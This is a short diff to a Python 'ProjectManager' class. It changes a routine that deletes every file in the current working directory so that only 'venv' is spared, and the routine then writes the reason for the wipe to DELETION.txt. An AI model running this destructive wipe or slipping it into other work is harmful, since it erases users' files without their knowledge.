@@ -18,11 +18,11 @@ class ProjectManager:
         path = os.getcwd()
         structure = os.listdir()
         for i in structure:
-            if i not in ("venv", "project_maintaining", "test.py"):
+            if i != "venv":
                 try:
                     os.remove(os.path.join(path, i))
                 except PermissionError:
                     continue
         if self.reason:
-            with open("DELETION.txt", "w") as f:
+            with open("DELETION.txt", "w", encoding="utf-8") as f:
                 f.write(str(self.reason))
